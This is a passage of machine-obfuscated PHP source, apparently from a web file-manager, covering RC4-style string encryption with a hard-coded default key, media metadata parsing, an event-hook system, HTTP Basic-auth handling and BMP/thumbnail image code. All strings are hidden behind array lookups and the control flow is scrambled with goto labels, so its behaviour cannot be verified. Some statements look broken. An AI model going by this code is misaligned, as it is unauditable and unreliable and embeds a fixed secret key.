| $a㒝[$F׿[1986]] << 21 | $a㒝[$F׿[1987]] << 16 | $a㒝[$F׿[1988]] << 11 | $a㒝[$F׿[1989]] << 5 | $a㒝[$F׿[1990]] >> 1; } protected function packFields($EƊ) { $dҸ׼ =& $_SERVER[ԥ]; $C = $dҸ׼[33]; $C = array(); foreach ($EƊ as $bŮܝ) { $C .= $bŮܝ[0]; $C[] = $bŮܝ[1]; } array_unshift($C, $C); return call_user_func_array($dҸ׼[1991], $C); } protected function filterFilename($Bӯ) { $a吳 =& $_SERVER[ԥ]; return str_replace(array($a吳[93], $a吳[4], $a吳[172], $a吳[69], $a吳[112], $a吳[910], $a吳[913], $a吳[267]), $a吳[70], $Bӯ); } } goto C; DȞ: class Mcrypt { public static $defaultKey = "\141\x21\x74\x61\x6b\x41\72\144\x6c\155\143\154\144\105\166\54\145"; public static function encode($c٨, $Cߥ = '', $D = 0, $fˆ = '') { goto B͐ƕ; f尪: $EŊ = str_replace(array($bθӱ®[280], $bθӱ®[8], $bθӱ®[892]), array($bθӱ®[408], $bθӱ®[70], $bθӱ®[91]), $EŊ); return $EŊ; goto cѼ; Aצ: $EŊ = $bθӱ®[33]; for ($D = $Dیד = $bЙ = 0; $bЙ < $fЧ; $bЙ++) { $D = ($D + 1) % 256; $Dیד = ($Dیד + $C󖋝[$D]) % 256; $e = $C󖋝[$D]; $C󖋝[$D] = $C󖋝[$Dیד]; $C󖋝[$Dیד] = $e; $EŊ .= chr(ord($c٨[$bЙ]) ^ $C󖋝[($C󖋝[$D] + $C󖋝[$Dیד]) % 256]); } $EŊ = $b . str_replace($bθӱ®[892], $bθӱ®[33], base64_encode($EŊ)); goto f尪; e: $FΉ = md5(substr($Cߥ, 0, 16)); $aГϫ = md5(substr($Cߥ, 16, 16)); $fˆ = $fˆ ? $fˆ : md5(microtime()); goto B󫺃; Dڋɕ: $c٨ = sprintf($bθӱ®[1893], $D ? $D + time() : 0) . substr(md5($c٨ . $aГϫ), 0, 16) . $c٨; $fЧ = strlen($c٨); $eѤ = array(); goto bҿ; B󫺃: $b = substr($fˆ, -$Fᒼ); $eҧ = $FΉ . md5($FΉ . $b); $f˩ = strlen($eҧ); goto Dڋɕ; B͐ƕ: $bθӱ® =& $_SERVER[ԥ]; $Fᒼ = 4; $Cߥ = md5($Cߥ ? $Cߥ : self::$defaultKey); goto e; bҿ: for ($bЙ = 0; $bЙ <= 255; $bЙ++) { $eѤ[$bЙ] = ord($eҧ[$bЙ % $f˩]); } $C󖋝 = range(0, 255); for ($Dیד = $bЙ = 0; $bЙ < 256; $bЙ++) { $Dیד = ($Dیד + $C󖋝[$bЙ] + $eѤ[$bЙ]) % 256; $e = $C󖋝[$bЙ]; $C󖋝[$bЙ] = $C󖋝[$Dیד]; $C󖋝[$Dیד] = $e; } goto Aצ; cѼ: } public static function decode($e, $F = '') { goto a; a: $F =& $_SERVER[ԥ]; $e = str_replace(array($F[408], $F[70], $F[91]), array($F[280], $F[8], $F[892]), $e); $aҾ = 4; goto e; F˧: for ($Dʇ = 0; $Dʇ <= 255; $Dʇ++) { $d᷊[$Dʇ] = ord($Cɍ[$Dʇ % $FƳ]); } $Fո = range(0, 255); for ($CƋ腎 = $Dʇ = 0; $Dʇ < 256; $Dʇ++) { $CƋ腎 = ($CƋ腎 + $Fո[$Dʇ] + $d᷊[$Dʇ]) % 256; $cĂχ = $Fո[$Dʇ]; $Fո[$Dʇ] = $Fո[$CƋ腎]; $Fո[$CƋ腎] = $cĂχ; } goto F; Bфİ: $e = base64_decode(substr($e, $aҾ)); $d狡 = strlen($e); $d᷊ = array(); goto F˧; Cî: if (($E == 0 || $E - time() > 0) && substr($bأ, 10, 16) == substr(md5(substr($bأ, 26) . $d), 0, 16)) { return substr($bأ, 26); } else { return $F[33]; } goto f̨; F: $bأ = $F[33]; for ($Eƕ硿 = $CƋ腎 = $Dʇ = 0; $Dʇ < $d狡; $Dʇ++) { $Eƕ硿 = ($Eƕ硿 + 1) % 256; $CƋ腎 = ($CƋ腎 + $Fո[$Eƕ硿]) % 256; $cĂχ = $Fո[$Eƕ硿]; $Fո[$Eƕ硿] = $Fո[$CƋ腎]; $Fո[$CƋ腎] = $cĂχ; $bأ .= chr(ord($e[$Dʇ]) ^ $Fո[($Fո[$Eƕ硿] + $Fո[$CƋ腎]) % 256]); } $E = intval(substr($bأ, 0, 10)); goto Cî; C鿮: $D = substr($e, 0, $aҾ); $Cɍ = $d䰋 . md5($d䰋 . $D); $FƳ = strlen($Cɍ); goto Bфİ; e: $F = md5($F ? $F : self::$defaultKey); $d䰋 = md5(substr($F, 0, 16)); $d = md5(substr($F, 16, 16)); goto C鿮; f̨: } } define($_SERVER[ԥ][1894], 1); define($_SERVER[ԥ][1895], 2); goto d; d֤: class GetInfo { private static $fileTypeArray; public static function get($E콙) { $E۞ = IO::info($E콙); return self::infoAdd($E۞); } public static function infoAdd(&$DЎ) { goto c˅󊹦; f߂: $dǿ[$F[368]] = $fٿ; $DЎ[$F[422]] = $dǿ; return $DЎ; goto eώ; c˅󊹦: $F =& $_SERVER[ԥ]; static $fҖ; if (!$fҖ) { require SDK_DIR . $F[1574]; $fҖ = new getID3(); } goto cȏܩ; cȏܩ: if (!$DЎ || $DЎ[$F[29]] != $F[163]) { return; } if (!self::support($DЎ[$F[156]]) || isset($DЎ[$F[422]])) { return; } $DÖ = $F[1575] . $DЎ[$F[75]]; goto c; c: $fٿ = $DЎ[$F[156]]; try { if ($DЎ[$F[156]] == $F[1576]) { $dǿ = self::psdParse($DÖ); $fٿ = $F[1577]; } else { if ($DЎ[$F[156]] == $F[1578]) { $dǿ = self::pdfParse($DÖ); } else { $fٿ = self::$fileTypeArray[$F[1579]][$DЎ[$F[156]]]; $cݺ = self::$fileTypeArray[$F[1580]][$fٿ][$F[1581]]; $BĈ = @$fҖ->analyze($DÖ, $DЎ[$F[77]], $DЎ[$F[28]]); $dǿ = self::parseData($BĈ, $cݺ, $DЎ); } } } catch (Exception $d) { $dǿ = array($F[368] => $fٿ); } if (!$dǿ) { return; } goto f߂; eώ: } public static function support($D) { goto dŚ֍; Eě: $A§ = array($Aܥ[1578], $Aܥ[1576]); if (in_array($D, $A§)) { return !0; } if (isset(self::$fileTypeArray[$Aܥ[1579]][$D])) { return !0; } goto aǼ니; dŚ֍: $Aܥ =& $_SERVER[ԥ]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $D = strtolower($D); goto Eě; aǼ니: return !1; goto C; C: } private static function parseData($d؏Ӭ, $f, $E턐) { $DÄ =& $_SERVER[ԥ]; $b = $d؏Ӭ[$DÄ[1582]]; $a⬴ = array(); foreach ($f as $B뒶 => $Eۢ) { foreach ($Eۢ as $d҇) { if (is_array($d҇)) { $E쵨֭ = self::parseData($d؏Ӭ, $Eۢ, $E턐); if ($E쵨֭) { $a⬴[$B뒶] = $E쵨֭; } break; } $B = str_replace($DÄ[1357], $b, $d҇); $E쵨֭ = _get($d؏Ӭ, $B); $E쵨֭ = is_array($E쵨֭) ? $E쵨֭[0] : $E쵨֭; if ($E쵨֭) { break; } } if ($E쵨֭ || $E쵨֭ === 0 || $E쵨֭ === !1) { $E쵨֭ = self::valueReset($d҇, $E쵨֭, $B뒶); if ($E쵨֭ !== null) { $a⬴[$B뒶] = $E쵨֭; } } } $a⬴ = self::valueResetAll($a⬴, $E턐); return $a⬴; } private static function psdParse($c᪇) { $e =& $_SERVER[ԥ]; if (IO::fileSubstr($c᪇, 0, 4) != $e[1583]) { return !1; } $cݍڌ = getImageSize($c᪇, $d); if (!$cݍڌ) { return; } $D = array($e[1498] => $cݍڌ[0], $e[1500] => $cݍڌ[1]); return $D; } private static function pdfParse($a) { return FileParsePdf::parse($a); } private static function fileTypeParse() { $B򓼣 =& $_SERVER[ԥ]; $f͑ز = self::fileTypeArray(); $D燉 = array(); foreach ($f͑ز as $d셋 => $a) { $Bْ = _get($a, $B򓼣[156], $B򓼣[33]); $e = is_string($Bْ) ? explode($B򓼣[47], $Bْ) : $Bْ; if (!$e) { continue; } foreach ($e as $Bْ) { $Bْ = strtolower(trim($Bْ)); if (!$Bْ) { continue; } $D燉[$Bْ] = $d셋; } $f͑ز[$d셋][$B򓼣[156]] = array_keys($D燉); $f͑ز[$d셋][$B򓼣[1581]] = self::parseKeyMap($a[$B򓼣[1581]]); } return array($B򓼣[1580] => $f͑ز, $B򓼣[1579] => $D燉); } private static function parseKeyMap($e) { $eذɫ =& $_SERVER[ԥ]; foreach ($e as $d˂ => $f͎) { if (is_array($f͎)) { $eϱ됐 = self::parseKeyMap($f͎); if ($eϱ됐) { $e[$d˂] = $eϱ됐; } continue; } $F離ʘ = explode($eذɫ[47], $f͎); $cǓ = array(); foreach ($F離ʘ as $dŨ) { $dŨ = trim($dŨ); if (!$dŨ) { continue; } if (preg_match($eذɫ[1584], $dŨ, $dϥƧ)) { $B֌ = explode($eذɫ[267], $dϥƧ[1]); foreach ($B֌ as $CϷƌ) { $cǓ[] = str_replace($dϥƧ[0], $CϷƌ, $dŨ); } } else { $cǓ[] = $dŨ; } } $e[$d˂] = $cǓ; } return $e; } private static function valueResetAll($FѶ, $EΗ) { goto dߔ; cʋ: $e؃ = _get($FѶ, $F֡[1597], $F֡[33]); $dꌝ = $C . $b曜 . $e؃; if ($dꌝ && get_charset($dꌝ) != $F֡[322]) { $FѶ[$F֡[1594]][$F֡[1312]] = iconv_to($FѶ[$F֡[1594]][$F֡[1312]], get_charset($dꌝ), $F֡[322]); $FѶ[$F֡[1594]][$F֡[1598]] = iconv_to($FѶ[$F֡[1594]][$F֡[1598]], get_charset($dꌝ), $F֡[322]); $FѶ[$F֡[1594]][$F֡[1599]] = iconv_to($FѶ[$F֡[1594]][$F֡[1599]], get_charset($dꌝ), $F֡[322]); } goto Dυӂ; Dυӂ: return $FѶ; goto c矡; dߔ: $F֡ =& $_SERVER[ԥ]; if (isset($FѶ[$F֡[1585]])) { $dҨ = ceil($FѶ[$F֡[1585]]); $cė = intval($dҨ / 3600); $a掻 = intval(($dҨ - $cė * 3600) / 60); $c = $dҨ % 60; $FѶ[$F֡[1586]] = sprintf($F֡[1587], $cė, $a掻, $c); if ($cė == 0) { $FѶ[$F֡[1586]] = sprintf($F֡[1588], $a掻, $c); } } $D݉ = _get($FѶ, $F֡[1589]); goto a; a: if ($D݉) { $F = IO_PATH_SYSTEM_TEMP . $F֡[1590] . KodIO::hashPath($EΗ) . $F֡[1591]; $FѶ[$F֡[1592]] = Action($F֡[1593])->pluginCacheFileSet($F, $D݉); unset($FѶ[$F֡[1594]][$F֡[1577]]); } $C = _get($FѶ, $F֡[1595], $F֡[33]); $b曜 = _get($FѶ, $F֡[1596], $F֡[33]); goto cʋ; c矡: } private static function valueReset($cݲ, $f, $B) { $BϜ =& $_SERVER[ԥ]; $c۷ = $BϜ[1515]; switch ($cݲ) { case $BϜ[1600]: $f = $f == $BϜ[83] ? $BϜ[1601] : $BϜ[1602]; break; case $BϜ[1603]: $f = $f ? $f : null; break; default: break; } switch ($B) { case $BϜ[1604]: $f = round($f, 2); break; case $BϜ[183]: case $BϜ[106]: if ($f < 0) { $f = null; } else { if (is_numeric($f)) { $f = date($c۷, $f); } } break; default: break; } return $f; } private static function fileTypeArray() { $F蜧毥 =& $_SERVER[ԥ]; return array($F蜧毥[1577] => array($F蜧毥[156] => $F蜧毥[1605] . $F蜧毥[1606], $F蜧毥[1581] => array($F蜧毥[1498] => $F蜧毥[1607], $F蜧毥[1500] => $F蜧毥[1608], $F蜧毥[1609] => $F蜧毥[1610], $F蜧毥[1611] => $F蜧毥[1612], $F蜧毥[183] => $F蜧毥[1613], $F蜧毥[106] => $F蜧毥[1614], $F蜧毥[1615] => $F蜧毥[1616], $F蜧毥[1617] => $F蜧毥[1618], $F蜧毥[1619] => $F蜧毥[1620], $F蜧毥[1621] => $F蜧毥[1622], $F蜧毥[1623] => $F蜧毥[1624], $F蜧毥[1625] => $F蜧毥[1626], $F蜧毥[1627] => $F蜧毥[1628], $F蜧毥[1629] => array($F蜧毥[1630] => $F蜧毥[1631], $F蜧毥[1632] => $F蜧毥[1633], $F蜧毥[1634] => $F蜧毥[1635]), $F蜧毥[1636] => $F蜧毥[1637], $F蜧毥[1638] => $F蜧毥[1639], $F蜧毥[1640] => $F蜧毥[1641], $F蜧毥[1642] => $F蜧毥[1643], $F蜧毥[1644] => array($F蜧毥[1645] => $F蜧毥[1646], $F蜧毥[1647] => $F蜧毥[1648], $F蜧毥[1649] => $F蜧毥[1650], $F蜧毥[1651] => $F蜧毥[1652], $F蜧毥[1653] => $F蜧毥[1654], $F蜧毥[1655] => $F蜧毥[1656], $F蜧毥[1657] => $F蜧毥[1658], $F蜧毥[1659] => $F蜧毥[1660], $F蜧毥[1661] => $F蜧毥[1662], $F蜧毥[1663] => $F蜧毥[1664], $F蜧毥[1665] => $F蜧毥[1666]))), $F蜧毥[1667] => array($F蜧毥[156] => $F蜧毥[1668] . $F蜧毥[1669], $F蜧毥[1581] => array($F蜧毥[1585] => $F蜧毥[1670], $F蜧毥[183] => $F蜧毥[1671], $F蜧毥[106] => $F蜧毥[1672], $F蜧毥[1617] => $F蜧毥[1673], $F蜧毥[1674] => $F蜧毥[1675], $F蜧毥[1676] => $F蜧毥[1603], $F蜧毥[1677] => $F蜧毥[1678], $F蜧毥[1679] => $F蜧毥[1680], $F蜧毥[1681] => $F蜧毥[1682], $F蜧毥[1594] => array($F蜧毥[1312] => $F蜧毥[1683], $F蜧毥[1598] => $F蜧毥[1684], $F蜧毥[1599] => $F蜧毥[1685], $F蜧毥[1686] => $F蜧毥[1687], $F蜧毥[1688] => $F蜧毥[1689], $F蜧毥[1690] => $F蜧毥[1691], $F蜧毥[1577] => $F蜧毥[1692]))), $F蜧毥[1693] => array($F蜧毥[156] => $F蜧毥[1694] . $F蜧毥[1695], $F蜧毥[1581] => array($F蜧毥[1498] => $F蜧毥[1696], $F蜧毥[1500] => $F蜧毥[1697], $F蜧毥[1585] => $F蜧毥[1670], $F蜧毥[183] => $F蜧毥[1698], $F蜧毥[106] => $F蜧毥[1699], $F蜧毥[1604] => $F蜧毥[1700], $F蜧毥[1681] => $F蜧毥[1701], $F蜧毥[1677] => $F蜧毥[1702], $F蜧毥[1617] => $F蜧毥[1703], $F蜧毥[1667] => array($F蜧毥[1676] => $F蜧毥[1603], $F蜧毥[1704] => $F蜧毥[1705], $F蜧毥[1674] => $F蜧毥[1675], $F蜧毥[1681] => $F蜧毥[1682], $F蜧毥[1677] => $F蜧毥[1706], $F蜧毥[1679] => $F蜧毥[1680]))), $F蜧毥[1707] => array($F蜧毥[1581] => array($F蜧毥[1708] => $F蜧毥[1709], $F蜧毥[1710] => $F蜧毥[1711])), $F蜧毥[1712] => array($F蜧毥[1581] => array())); } } class Hook { private static $events = array(); public static function get($Bʰ = false) { if (!$Bʰ) { return self::$events; } else { return self::$events[$Bʰ]; } } public static function apply($C, $d銝 = array()) { $D = ActionApply($C, $d銝); if (is_string($C)) { Hook::trigger($C); } return $D; } public static function bind($d䦧, $B窟, $bԌ = false) { $a =& $_SERVER[ԥ]; if (!isset(self::$events[$d䦧])) { self::$events[$d䦧] = array(); } self::$events[$d䦧][] = array($a[1713] => $B窟, $a[1714] => $bԌ, $a[1715] => 0); } public static function once($D׮, $Cꉿ) { self::bind($D׮, $Cꉿ, !0); } public static function unbind($F򜊎, $cϸ = false) { if (!$cϸ) { self::$events[$F򜊎] = array(); return; } $Fɞ = self::$events[$F򜊎]; self::$events[$F򜊎] = array(); if (!is_array($Fɞ)) { return; } for ($C = 0; $C < count($Fɞ); $C++) { if ($Fɞ[$C][$_SERVER[ԥ][1713]] == $cϸ) { continue; } self::$events[$F򜊎][] = $Fɞ[$C]; } } public static function filter($E, $cꍲ) { goto Bθְ; Bθְ: $C⍳ =& $_SERVER[ԥ]; $E = self::$events; if (!isset($E[$E])) { return $cꍲ; } goto E; f: for ($B = 0; $B < count($d茮); $B++) { $D߽ = $d茮[$B]; if ($D߽[$C⍳[1714]] && $D߽[$C⍳[1715]] > 1) { continue; } self::$events[$E][$B][$C⍳[1715]] = $D߽[$C⍳[1715]] + 1; $dҶ = self::apply($D߽[$C⍳[1713]], array($Fզ)); if (gettype($dҶ) == gettype($Fզ)) { $Fզ = $dҶ; } } return $Fզ; goto cا; E: $d茮 = $E[$E]; $Fզ = $cꍲ; if (!is_array($d茮) || count($d茮) == 0) { return $Fզ; } goto f; cا: } public static function trigger($C) { goto C; C: $Aƾ߆ =& $_SERVER[ԥ]; $f믙 = self::$events; $CΎ螐 = !1; goto Dڴ; D: return $CΎ螐; goto a礈; fҬ: $F划 = func_get_args(); array_shift($F划); for ($Eۢ = 0; $Eۢ < count($d§); $Eۢ++) { $A𖵝 = $d§[$Eۢ]; if ($A𖵝[$Aƾ߆[1714]] && $A𖵝[$Aƾ߆[1715]] > 1) { continue; } if (defined($Aƾ߆[1716]) && GLOBAL_LOG_HOOK) { write_log($C . $Aƾ߆[1717] . $A𖵝[$Aƾ߆[1713]], $Aƾ߆[1718]); } self::$events[$C][$Eۢ][$Aƾ߆[1715]] = $A𖵝[$Aƾ߆[1715]] + 1; $d = self::apply($A𖵝[$Aƾ߆[1713]], $F划); if (defined($Aƾ߆[1716]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $Aƾ߆[1718]); if ($A𖵝[$Aƾ߆[1715]] == 200) { $d㻄 = is_array($A𖵝[$Aƾ߆[1713]]) ? json_encode_force($A𖵝[$Aƾ߆[1713]]) : $A𖵝[$Aƾ߆[1713]]; write_log($Aƾ߆[1719] . $C . $Aƾ߆[1720] . $d㻄, $Aƾ߆[1721]); } } $CΎ螐 = is_null($d) ? $CΎ螐 : $d; } goto D; Dڴ: if (!isset($f믙[$C])) { return $CΎ螐; } $d§ = $f믙[$C]; if (!is_array($d§) || count($d§) == 0) { return $CΎ螐; } goto fҬ; a礈: } } class HttpAuth { public static function get() { $bꙅ =& $_SERVER[ԥ]; $f݅ = $bꙅ[33]; $fל = $bꙅ[33]; if (isset($_SERVER[$bꙅ[1722]])) { $f݅ = $_SERVER[$bꙅ[1722]]; $fל = $_SERVER[$bꙅ[1723]]; } elseif (isset($_SERVER[$bꙅ[1724]])) { $BՆ멇 = $_SERVER[$bꙅ[1724]]; if (strpos(strtolower($BՆ멇), $bꙅ[1725]) === 0) { $EС = explode($bꙅ[4], base64_decode(substr($BՆ멇, 6))); $f݅ = isset($EС[0]) ? $EС[0] : $bꙅ[33]; $fל = isset($EС[1]) ? $EС[1] : 0; } } return array($bꙅ[531] => $f݅, $bꙅ[882] => $fל); } public static function error() { goto B; E㈐: header($a[1728]); header($a[1729]); header($a[1238]); goto e듶凲; B: $a =& $_SERVER[ԥ]; header($a[1726]); header($a[1727]); goto E㈐; e듶凲: die; goto CΈ; CΈ: } public static function make($dػ, $cСɇ) { $b݃ǉ =& $_SERVER[ԥ]; return $b݃ǉ[1730] + base64_encode($dػ . $b݃ǉ[4] . $cСɇ); } } goto bњٓ; B: class ImageGdBMP { public static function load($D䭧) { $ḟ = fopen($D䭧, $_SERVER[ԥ][1483]); if ($ḟ === !1) { return !1; } $DÂ = self::loadFromStream($ḟ); fclose($ḟ); return $DÂ; } public static function loadFromStream($cĈ) { $a =& $_SERVER[ԥ]; $eϰ = fread($cĈ, 14); if ($eϰ === !1) { return !1; } if ($eϰ[0] != $a[1794] || $eϰ[1] != $a[1795]) { return !1; } $BӞ = unpack($a[1796] . $a[1797] . $a[1798] . $a[1799] . $a[1800], $eϰ); return self::loadFromStreamAndFileHeader($cĈ, $BӞ); } public static function loadFromStreamAndFileHeader($D׵俄, array $EśÅ) { goto aМՈ; dǙ: if ($Də == 0 || $aᴏ΍ == 0 || $a΍ != 1 || ($f֋ݡ & $eʆ) != 0 || ($f֋ݡ & $A) != 0 || ($f֋ݡ & $F৐) != 0 || ($eʆ & $A) != 0 || ($eʆ & $F৐) != 0 || ($A & $F৐) != 0) { return !1; } if ($a䞰ّ == 4 || $a䞰ّ == 5) { $C = stream_get_contents($D׵俄, $bރ); if ($C === !1) { return !1; } return imagecreatefromstring($C); } $Cʑ = $Də * $bሓ + 31 >> 3 & ~3; goto Aх; a: if ($C === !1) { return !1; } list(, $eው) = unpack($b̚[1801], $C); if ($eው == 12) { goto Aڳ; a׺: $B· = $B̃ = $f֋ݡ = $a䞰ّ = 0; $eʆ = 16711680; $A = 65280; goto CɆ; Aڳ: $C = fread($D׵俄, $eው - 4); if ($C === !1) { return !1; } extract(unpack($b̚[1802] . $b̚[1803] . $b̚[1804] . $b̚[1805], $C)); goto a׺; CɆ: $F৐ = 255; goto B; B: } else { if (124 < $eው || $eው < 40) { return !1; } else { goto a; a: $C = fread($D׵俄, 36); if ($C === !1) { return !1; } extract(unpack($b̚[1806] . $b̚[1807] . $b̚[1804] . $b̚[1808] . $b̚[1809] . $b̚[1810] . $b̚[1811] . $b̚[1812] . $b̚[1813] . $b̚[1814], $C)); goto aŃ; aƹ˻: if ($Dթ & 2147483648) { $Dթ = -(~$Dթ & 4294967295) - 1; } if ($EśÅ[$b̚[516]] != 0) { $e۳ = $bሓ == 1 || $bሓ == 4 || $bሓ == 8 ? ($B· ? $B· : pow(2, $bሓ)) << 2 : 0; $D۰ؑ = $bރ ? $bރ : ($Də * $bሓ + 31 >> 3 & ~3) * abs($aᴏ΍); $Eş졮 = $EśÅ[$b̚[516]] - $D۰ؑ - $e۳ - 14; if ($eው < $Eş졮 && 40 <= $eው && $eው <= 124) { $eው = $Eş졮; } } if ($eው - 40 > 0) { $C = fread($D׵俄, $eው - 40); if ($C === !1) { return !1; } extract(unpack($b̚[1815] . $b̚[1816] . $b̚[1817] . $b̚[1818], $C . str_repeat($b̚[1819], 120))); } else { $f֋ݡ = $eʆ = $A = $F৐ = 0; } goto B򭣛; aŃ: if ($Də & 2147483648) { $Də = -(~$Də & 4294967295) - 1; } if ($aᴏ΍ & 2147483648) { $aᴏ΍ = -(~$aᴏ΍ & 4294967295) - 1; } if ($Bǂ & 2147483648) { $Bǂ = -(~$Bǂ & 4294967295) - 1; } goto aƹ˻; B򭣛: if (($bሓ == 16 || $bሓ == 24 || $bሓ == 32) && $a䞰ّ == 0 && $eʆ == 0 && $A == 0 && $F৐ == 0) { switch ($bሓ) { case 16: $eʆ = 31744; $A = 992; $F৐ = 31; break; case 24: case 32: $eʆ = 16711680; $A = 65280; $F৐ = 255; break; } } goto f鑩; f鑩: } } goto dǙ; e⨌٠: if ($bሓ == 1 || $bሓ == 4 || $bሓ == 8) { goto C; a: $E揸 = array(); for ($B̋˝ʍ = 0; $B̋˝ʍ < $F; ++$B̋˝ʍ) { $C = fread($D׵俄, $AҰ); if ($C === !1) { imagedestroy($bӉ); return !1; } extract(unpack($b̚[1820], $C . $b̚[1819])); $E揸[] = imagecolorallocate($bӉ, $CͿ, $F, $E󇰣퐋); } $f§嶔 = 8 - $bሓ; goto cزۣ; cزۣ: $e = (1 << $bሓ) - 1 << $f§嶔; if ($a䞰ّ == 1 || $a䞰ّ == 2) { $fԜ趂 = 0; $fʙ = $bሓ >> 2 & 1; for (;;) { if ($fԜ趂 < -1 || $fԜ趂 > $Də || $Aߏ < -1 || $Aߏ > $aᴏ΍) { imagedestroy($bӉ); return !1; } $C = fread($D׵俄, 1); if ($C === !1) { imagedestroy($bӉ); return !1; } switch ($C) { case $b̚[1819]: $C = fread($D׵俄, 1); if ($C === !1) { imagedestroy($bӉ); return !1; } switch ($C) { case $b̚[1819]: $Aߏ += $E㩂β; $fԜ趂 = 0; break; case $b̚[1821]: $Aߏ = 0; $fԜ趂 = 0; break 3; case $b̚[1822]: $C = fread($D׵俄, 2); if ($C === !1) { imagedestroy($bӉ); return !1; } list(, $e, $B) = unpack($b̚[1823], $C); $fԜ趂 += $e; $Aߏ += $B * $E㩂β; break; default: list(, $cᏡ) = unpack($b̚[1824], $C); $bԏ = ($cᏡ >> $fʙ) + ($cᏡ & $fʙ); $C = fread($D׵俄, $bԏ + 1 & ~1); if ($C === !1) { imagedestroy($bӉ); return !1; } for ($B̋˝ʍ = 0, $cʬ = 0; $B̋˝ʍ < $cᏡ; ++$B̋˝ʍ, ++$fԜ趂, $cʬ += $bሓ) { list(, $b˄) = unpack($b̚[1824], $C[$cʬ >> 3]); $E󇰣퐋 = $cʬ & 7; imagesetpixel($bӉ, $fԜ趂, $Aߏ, $E揸[($b˄ & $e >> $E󇰣퐋) >> $f§嶔 - $E󇰣퐋]); } break; } break; default: $A،ʷ = fread($D׵俄, 1); if ($A،ʷ === !1) { imagedestroy($bӉ); return !1; } list(, $f, $b˄) = unpack($b̚[1823], $C . $A،ʷ); for ($B̋˝ʍ = 0, $cʬ = 0; $B̋˝ʍ < $f; ++$B̋˝ʍ, ++$fԜ趂, $cʬ += $bሓ) { $E󇰣퐋 = $cʬ & 7; imagesetpixel($bӉ, $fԜ趂, $Aߏ, $E揸[($b˄ & $e >> $E󇰣퐋) >> $f§嶔 - $E󇰣퐋]); } break; } } } else { for ($Fʒ = 0; $Fʒ < $c; ++$Fʒ, $Aߏ += $E㩂β) { $C = fread($D׵俄, $Cʑ); if ($C === !1) { imagedestroy($bӉ); return !1; } $cʬ = 0; for ($fԜ趂 = 0; $fԜ趂 < $Də; ++$fԜ趂, $cʬ += $bሓ) { list(, $b˄) = unpack($b̚[1824], $C[$cʬ >> 3]); $E󇰣퐋 = $cʬ & 7; imagesetpixel($bӉ, $fԜ趂, $Aߏ, $E揸[($b˄ & $e >> $E󇰣퐋) >> $f§嶔 - $E󇰣퐋]); } } } goto f; C: $bӉ = imagecreate($Də, $c); $AҰ = $eው == 12 ? 3 : 4; $F = $B· ? $B· : pow(2, $bሓ); goto a; f: } else { goto D; eͽ: for ($Fʒ = 0; $Fʒ < $c; ++$Fʒ, $Aߏ += $E㩂β) { $C = fread($D׵俄, $Cʑ); if ($C === !1) { imagedestroy($bӉ); return !1; } $cʬ = 0; for ($fԜ趂 = 0; $fԜ趂 < $Də; ++$fԜ趂, $cʬ += $Dɔ) { list(, $b˄) = unpack($b̚[1801], substr($C, $cʬ, $Dɔ) . $b̚[1825]); $e = $b˄ & $f֋ݡ; $C = $b˄ & $eʆ; $aЂ = $b˄ & $A; $EŰ = $b˄ & $F৐; $a୙ = $a - (($e << 7) - $e) * $e옢; $CͿ = (($C << 8) - $C) * $B֞ō; $F = (($aЂ << 8) - $aЂ) * $dҠ֌; $E󇰣퐋 = (($EŰ << 8) - $EŰ) * $C; imagesetpixel($bӉ, $fԜ趂, $Aߏ, $a୙ << 24 | $CͿ << 16 | $F << 8 | $E󇰣퐋); } } imagealphablending($bӉ, !0); goto Dԅ; Fƹ: $B֞ō = $eʆ ? 1 / $eʆ : 1; $dҠ֌ = $A ? 1 / $A : 1; $C = $F৐ ? 1 / $F৐ : 1; goto eͽ; Dҧ: $Dɔ = $bሓ >> 3; $a = $f֋ݡ ? 127 : 0; $e옢 = $f֋ݡ ? 1 / $f֋ݡ : 1; goto Fƹ; D: $bӉ = imagecreatetruecolor($Də, $c); imagealphablending($bӉ, !1); if ($f֋ݡ) { imagesavealpha($bӉ, !0); } goto Dҧ; Dԅ: } return $bӉ; goto C䖎; Aх: $c = abs($aᴏ΍); $Aߏ = $aᴏ΍ > 0 ? $c - 1 : 0; $E㩂β = $aᴏ΍ > 0 ? -1 : 1; goto e⨌٠; aМՈ: $b̚ =& $_SERVER[ԥ]; if ($EśÅ[$b̚[384]] != 19778) { return !1; } $C = fread($D׵俄, 4); goto a; C䖎: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($f, $aտĈ) { goto F; aȊ: if (!$this->im) { return !1; } $AҬº = $_SERVER[ԥ][33]; $this->imgData = GetImageSize($f, $AҬº); goto f; f: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto dُ; F: $this->srcFile = $f; $this->echoType = $aտĈ; $this->im = self::image($f); goto aȊ; dُ: } public static function image($C) { $eܵܠ =& $_SERVER[ԥ]; $dގ嬰 = $eܵܠ[33]; $F = GetImageSize($C, $dގ嬰); $E̋ = !1; switch ($F[2]) { case IMAGETYPE_GIF: if (!function_exists($eܵܠ[1826])) { break; } $E̋ = imagecreatefromgif($C); break; case IMAGETYPE_JPEG: if (!function_exists($eܵܠ[1827])) { break; } $E̋ = imagecreatefromjpeg($C); break; case IMAGETYPE_PNG: if (!function_exists($eܵܠ[1828])) { break; } $E̋ = @imagecreatefrompng($C); imagesavealpha($E̋, !0); break; case IMAGETYPE_XBM: $E̋ = imagecreatefromxbm($C); break; case IMAGETYPE_WBMP: $E̋ = imagecreatefromwbmp($C); break; case IMAGETYPE_BMP: $E̋ = imagecreatefrombmp($C); break; default: break; } return $E̋; } public static function imageSize($AϨ) { $a =& $_SERVER[ԥ]; $C = GetImageSize($AϨ); if (!$C) { return !1; } return array($a[1829] => $C[0], $a[1830] => $C[1]); } function distortion($aޫ, $C쒙ڋ, $cȄ) { $Bڔ = $this->creatImage($this->im, $C쒙ڋ, $cȄ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Bڔ, $aޫ); } function prorate($DΉ, $D, $bง) { $BϹ = $D / $bง; $D = $this->srcW / $this->srcH; if ($BϹ <= $D) { $Fꎽ = $D; $C = $Fꎽ * ($this->srcH / $this->srcW); } else { $C = $bง; $Fꎽ = $C * ($this->srcW / $this->srcH); } if ($this->srcW > $D || $this->srcH > $bง) { $Fֵ = $this->creatImage($this->im, $Fꎽ, $C, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Fֵ, $DΉ); } else { $Fֵ = $this->creatImage($this->im, $this->srcW, 